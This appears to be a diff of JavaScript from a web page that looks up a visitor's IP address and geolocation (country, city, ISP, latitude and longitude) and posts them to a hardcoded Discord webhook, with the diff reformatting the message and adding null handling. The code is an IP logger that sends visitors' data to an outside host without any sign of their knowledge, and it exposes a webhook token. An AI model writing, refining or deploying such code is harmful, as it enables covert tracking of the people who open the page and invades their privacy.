@@ -19,37 +19,23 @@
                 return { ip: ip, location: locationData };
             } catch (error) {
                 console.error('Error getting IP and location:', error);
+                return null;
             }
         }
 
         // Function to send the IP address and location to a Discord webhook
         async function sendToDiscord(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
+            const location = data.location || {};
             const payload = {
-                embeds: [
-                    {
-                        color: 0x3498db, // Blue color
-                        author: {
-                            name: "IP & Info"
-                        },
-                        fields: [
-                            {
-                                name: "IP:",
-                                value: data.ip
-                            },
-                            {
-                                name: "Location:",
-                                value: `**Country:** ${data.location.country_name || 'N/A'}\n` +
-                                       `**Region:** ${data.location.region_name || 'N/A'}\n` +
-                                       `**City:** ${data.location.city || 'N/A'}\n` +
-                                       `**ISP:** ${data.location.isp || 'N/A'}\n` +
-                                       `**Organization:** ${data.location.org || 'N/A'}\n` +
-                                       `**Latitude:** ${data.location.latitude || 'N/A'}\n` +
-                                       `**Longitude:** ${data.location.longitude || 'N/A'}`
-                            }
-                        ]
-                    }
-                ]
+                content: `User IP Address: ${data.ip}\n` +
+                         `Country: ${location.country_name || 'N/A'}\n` +
+                         `Region: ${location.region_name || 'N/A'}\n` +
+                         `City: ${location.city || 'N/A'}\n` +
+                         `ISP: ${location.isp || 'N/A'}\n` +
+                         `Organization: ${location.organization || 'N/A'}\n` +
+                         `Latitude: ${location.latitude || 'N/A'}\n` +
+                         `Longitude: ${location.longitude || 'N/A'}`
             };
 
             try {
